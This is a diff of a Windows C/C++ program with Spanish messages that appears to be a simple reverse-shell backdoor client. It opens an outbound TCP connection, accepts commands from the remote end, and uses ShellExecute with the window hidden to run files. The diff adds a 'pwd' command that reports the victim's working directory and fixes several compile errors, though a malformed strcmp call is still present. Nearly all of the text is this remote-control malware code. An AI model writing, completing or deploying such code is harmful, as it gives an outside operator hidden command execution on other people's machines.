@@ -5,7 +5,13 @@
 
 #pragma comment(lib, "Ws2_32.lib")
 
-void exec(char * ansVal, int ansLong, char *file){
+void pwd(char* ansVal, int ansLong){
+	TCHAR var[MAX_PATH];
+	GetCurrentDirectory(MAX_PATH, var);
+	strcat(ansVal,var);
+}
+
+void exec(char* ansVal, int ansLong, char *file){
 	if(32 >= (int)(ShellExecute(NULL,"open",file, NULL, NULL, SW_HIDE)))
 		strcat(ansVal, "[-] Error al ejecutar el comando\n");
 	else
@@ -42,6 +48,9 @@ void CreateSocket(SOCKET &socketS){
 void ConnectSocket(SOCKET &socketS,sockaddr_in &server){
 	if(connect(socketS, (sockaddr *) &server, sizeof(server)) == SOCKET_ERROR){
 		printf("Error al conectar\n");
+		closesocket(socketS);
+		WSACleanup();
+		exit(0);
 	}
 	else{
 		while(true){
@@ -52,9 +61,17 @@ void ConnectSocket(SOCKET &socketS,sockaddr_in &server){
 		//printf("Longitud: %d",Result);
 		//getchar();
 			if((strcmp(Received, "exit")==0)){
-				closesocket(tcpsock);
+				closesocket(socketS);
 				WSACleanup();
 				exit(0);
+			}
+			else if((strcmp(Received), "pwd")==0){
+				char buff[250] = "";
+				pwd(buff,250);
+				strcat(buff,"\n");
+				send(socketS,buff,strlen(buff)+1,0);
+				memset(buff,0,sizeof(buff));
+				memset(Received, 0, sizeof(buff));
 			}	
 			else{
 				char valSend[1024] = "";
@@ -65,23 +82,23 @@ void ConnectSocket(SOCKET &socketS,sockaddr_in &server){
 						valSend[i]=Received[i];
 				}
 				if(strcmp(valSend,"exec") ==0){
-					char exec[1024] = "";
+					char execute[1024] = "";
 					int j = 0;
 					for(int i=5;i<(*(&Received + 1) - Received); ++i){
-						exec[j] = Received[i];
+						execute[j] = Received[i];
 						++j;
 					}
 					char buff[250] = "";
-					exec(buff,250, exec);
-					strcat(buffer,"\n");
+					exec(buff,250, execute);
+					strcat(buff,"\n");
 					send(socketS, buff, strlen(buff) + 1, 0);
 					memset(buff,0,sizeof(buff));
-					memset(Received, 0, sizeoff(Received));
+					memset(Received, 0, sizeof(Received));
 				}
 				else{
-					char buff[25] == "[-]Comando no reconocido\n";
-					send(socketS, buff, strlen(buffer)+1,0);
-					memset(buffer, 0, sizeof(buffer));
+					char buff[30] = "[-]Comando no reconocido\n";
+					send(socketS, buff, strlen(buff)+1,0);
+					memset(buff, 0, sizeof(buff));
 					memset(Received,0,sizeof(Received));
 				}
 			}
